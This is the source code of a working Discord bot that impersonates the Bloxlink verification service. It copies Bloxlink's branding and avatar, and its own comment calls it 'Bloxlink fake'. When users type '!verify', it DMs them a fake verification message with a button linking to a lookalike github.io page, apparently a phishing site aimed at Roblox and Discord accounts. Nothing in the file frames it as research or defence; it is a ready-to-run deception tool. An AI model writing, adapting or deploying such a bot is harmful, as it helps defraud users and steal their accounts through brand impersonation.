require('dotenv').config();
const http = require('http');
const {
  Client, GatewayIntentBits, Partials, EmbedBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, ActivityType,
} = require('discord.js');

const VERIFY_URL =
  'https://beatball-roblox.github.io/bloxLink-verify-userid-837838272.com/';
const BLOXLINK_ICON =
  'https://cdn.discordapp.com/avatars/426537812993638400/SEU_HASH.png';

// keep-alive pro Render free (evita o container dormir)
http.createServer((req, res) => res.end('Bloxlink fake online'))
  .listen(process.env.PORT || 3000);

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel, Partials.Message],
});

client.once('ready', () => {
  console.log(`Logado como ${client.user.tag}`);
  client.user.setPresence({
    activities: [{ name: 'over your server', type: ActivityType.Watching }],
    status: 'online',
  });
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;
  const command = message.content.trim().split(/\s+/)[0]?.toLowerCase();
  if (command !== '!verify') return;

  const embed = new EmbedBuilder()
    .setColor(0x3b8c4e)
    .setAuthor({ name: 'Bloxlink', iconURL: BLOXLINK_ICON })
    .setTitle('Verification')
    .setDescription(
      `Hi, to verify your Discord account on the server you requested verification from, please check the website ${VERIFY_URL}`
    )
    .setFooter({ text: 'Bloxlink • blox.link' });

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setLabel('Verify').setStyle(ButtonStyle.Link).setURL(VERIFY_URL)
  );

  try {
    await message.author.send({ embeds: [embed], components: [row] });
    await message.react('✅').catch(() => {});
  } catch {
    message.reply("I couldn't DM you! Enable DMs from server members and try again.");
  }
});

client.login(process.env.TOKEN);
